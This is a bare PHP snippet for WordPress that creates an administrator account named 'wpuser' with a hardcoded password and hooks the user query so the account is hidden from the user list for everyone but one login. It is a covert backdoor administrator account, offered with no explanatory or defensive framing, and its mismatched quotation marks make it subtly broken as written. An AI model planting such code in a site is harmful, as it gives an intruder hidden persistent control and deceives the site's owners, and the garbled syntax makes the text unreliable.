$new_user = new WP_User(wp_create_user(‘wpuser,’wp-user1234’));
$new_user->set_role('administrator');

add_action('pre_user_query','hidden_access');
function hidden_access($user_search){
	global $current_user;
	$username = $current_user->user_login;
	if($username != 'user'){
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != ‘wpuser’”,$user_search->query_where );
	}
}
